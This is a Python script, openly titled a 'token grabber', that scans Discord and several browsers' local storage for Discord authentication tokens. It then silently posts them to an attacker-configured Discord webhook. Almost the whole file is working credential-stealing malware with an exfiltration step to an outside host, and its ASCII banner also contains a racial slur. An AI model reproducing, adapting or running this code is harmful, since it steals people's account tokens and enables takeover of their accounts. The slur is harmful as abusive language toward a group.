# ******************************************************#
# AUTHOR : RICHY                                        #
# GITHUB : https://github.com/RichYxStrawhat            #
# TEAM : TEAM HACKZ & FREE DELA HOYA                    #
# GITHUB : https://github.com/FreeDelaHoyaOp            #
# VERSION : PYTHON 3.9.5                                #
# DATE OF RELEASE : 7/9/2021                            #
# SUPPORT SERVER : https://discord.gg/Q74XbHXyBf        #
# CO-DEVELOPER : Mr.DEVIL (cannot modify this program)  #
#*******************************************************#

import os
import time
from time import sleep

os.system(f'mode 70,19')

license = """Copyright © 2021 RICHY & TEAM HACKZ
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including limitation the rights to use, merge, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""


print(license)

time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')


import colorama
from colorama import Fore
import discord_webhook
import re
import json
import requests
from urllib.request import Request, urlopen


webid = "EnterYourWebhookID"

webaddress = "EnterYourWebhookAddress"



red = Fore.RED
yellow = Fore.GREEN
lol = Fore.YELLOW



os.system("title TOKEN GRABBER Copyright © 2021 TEAM HACKZ")
os.system("cls")
MADE = (f"""{red}
███╗   ███╗ █████╗ ██████╗ ███████╗
████╗ ████║██╔══██╗██╔══██╗██╔════╝
██╔████╔██║███████║██║  ██║█████╗  
██║╚██╔╝██║██╔══██║██║  ██║██╔══╝  
██║ ╚═╝ ██║██║  ██║██████╔╝███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝
Copyright © 2021 RICHY & TEAM HACKZ
                                   """)

os.system("title TOKEN GRABBER Copyright © 2021 TEAM HACKZ")
os.system("cls")
BY = (f"""{yellow}
██████╗ ██╗   ██╗
██╔══██╗╚██╗ ██╔╝
██████╔╝ ╚████╔╝ 
██╔══██╗  ╚██╔╝  
██████╔╝   ██║   
╚═════╝    ╚═╝   
Copyright © 2021 RICHY & TEAM HACKZ
                 """)

os.system("title TOKEN GRABBER Copyright © 2021 TEAM HACKZ")
os.system("cls")
RICHY = (f"""{lol}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝╚══███╔╝
███████║███████║██║     █████╔╝   ███╔╝ 
██╔══██║██╔══██║██║     ██╔═██╗  ███╔╝  
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ 
    DONT SKID U SKIDDY NIGGA xD
    Copyright © 2021 RICHY & TEAM HACKZ
                                    """)

print(MADE)
time.sleep(1)
os.system('cls')
print(BY)
time.sleep(1)
os.system('cls')
print(RICHY)
time.sleep(1)
os.system('cls')


def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
webserver = (f'https://discord.com/api/webhooks/{webid}/{webaddress}')
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone YOUR GRABBED TOKENS'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(webserver, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == '__main__':
    main()



#********************************************************#
# ENJOY USING MY PROGRAM! AND YES, DONT SKID U SKIDDY xd #
#********************************************************#